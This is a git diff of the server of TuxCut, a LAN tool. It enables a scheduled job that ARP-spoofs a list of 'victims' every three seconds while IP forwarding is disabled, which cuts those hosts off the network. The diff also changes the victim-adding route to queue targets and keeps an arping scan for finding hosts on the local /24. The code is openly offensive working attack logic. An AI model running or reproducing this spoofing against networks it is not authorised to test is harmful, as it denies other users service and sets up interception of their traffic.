@@ -1,5 +1,6 @@
 import json
 import atexit
+from setproctitle import setproctitle
 import logging
 import subprocess as sp
 import netifaces
@@ -7,38 +8,41 @@ from scapy.all import *
 from bottle import route, run
 from bottle import request, response
 
-# from apscheduler.schedulers.background import BackgroundScheduler
-# from apscheduler.triggers.interval import IntervalTrigger
+from apscheduler.schedulers.background import BackgroundScheduler
+from apscheduler.triggers.interval import IntervalTrigger
 
 
 from utils import logger
-from utils import get_default_gw, get_hostname
+from utils import get_default_gw, get_my,get_hostname
 from utils import enable_ip_forward, disable_ip_forward, arp_spoof, arp_unspoof
 
+
+setproctitle('tuxcut-server')
 victims = list()
 
 
-# def attack_victims():
-#     if len(victims) > 0:
-#         for victim in victims:
-#             arp_spoof(victim)
-#
-#
-# scheduler = BackgroundScheduler()
-# scheduler.start()
-# scheduler.add_job(
-#     func=attack_victims,
-#     trigger=IntervalTrigger(seconds=1),
-#     id='arp_attack_job',
-#     name='ARP Spoofing the victim list',
-#     replace_existing=True)
+def attack_victims():
+    if len(victims) > 0:
+        disable_ip_forward()
+        for victim in victims:
+            arp_spoof(victim)
+
+
+scheduler = BackgroundScheduler()
+scheduler.start()
+scheduler.add_job(
+    func=attack_victims,
+    trigger=IntervalTrigger(seconds=3),
+    id='arp_attack_job',
+    name='ARP Spoofing the victim list',
+    replace_existing=True)
 
 
 # Shut down the scheduler when exiting the app
 def on_server_exit():
     logger.info('TuxCut server is shutting down')
     enable_ip_forward()
-    # scheduler.shutdown()
+    scheduler.shutdown()
 
 atexit.register(on_server_exit)
 
@@ -57,30 +61,17 @@ def server_status():
 
 
 @route('/my/<iface>')
-def get_my(iface):
+def get_my_info(iface):
     """
     find the IP and MAC  addressess for the given interface
     """
     response.headers['Content-Type'] = 'application/json'
-    get_addr = netifaces.ifaddresses(iface)
 
-    if netifaces.AF_INET in get_addr:
-        my_ip = get_addr[netifaces.AF_INET][0]['addr']
-        my_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
-    else:
-        # iface not connected
-        return json.dumps({
-            'status': 'error',
-            'msg': 'Network Card ({}) is not connected to any network'.format(iface)
-        })
+    my = get_my(iface)
 
     return json.dumps({
         'status': 'success',
-        'my': {
-            'ip': my_ip,
-            'mac': my_mac,
-            'hostname': get_hostname(my_ip)
-        }
+        'my': my
     })
 
 
@@ -111,6 +102,7 @@ def scan(gw_ip):
     ans, unans = arping('{}/24'.format(gw_ip), verbose=False)
 
     for i in range(0, len(ans)):
+
         live_hosts.append({
             'ip': ans[i][1].psrc,
             'mac': ans[i][1].hwsrc,
@@ -177,9 +169,7 @@ def add_to_victims():
 
     new_victim = request.json
     if new_victim not in victims:
-        disable_ip_forward()
-        arp_spoof(new_victim)
-        # victims.append(new_victim)
+        victims.append(new_victim)
 
     return json.dumps({
         'status': 'success',
